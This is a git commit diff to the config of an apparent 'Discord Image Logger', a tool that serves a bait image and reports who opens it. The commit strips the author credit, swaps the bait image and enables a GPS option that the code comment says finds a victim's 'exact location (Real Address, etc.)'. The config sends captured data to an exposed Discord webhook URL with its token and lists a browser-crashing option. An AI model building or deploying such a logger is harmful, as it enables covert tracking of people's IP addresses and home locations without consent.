532d9fcf1a2d99cc9973ddb6f382c267842af21c
Coderipgrapper <samikhartabil656@gmail.com>
2025-02-07 09:47:47 +0100

    Update image.py

--- image.py
+++ image.py
@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# By Anon | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1337339734074200064/8Ld0QaZHVs3POHssntqPPrBlQ0GdSmTXxHqd_hIPCmEekda2Zjq-m0JiTt3exyunnUL1",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGaCNzOE5DsTqjOeork8xKB6TSYH3y9NOD9w&s", # You can also have a custom image by using a URL argument
+    "image": "https://www.thisiscolossal.com/wp-content/uploads/2013/01/4.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
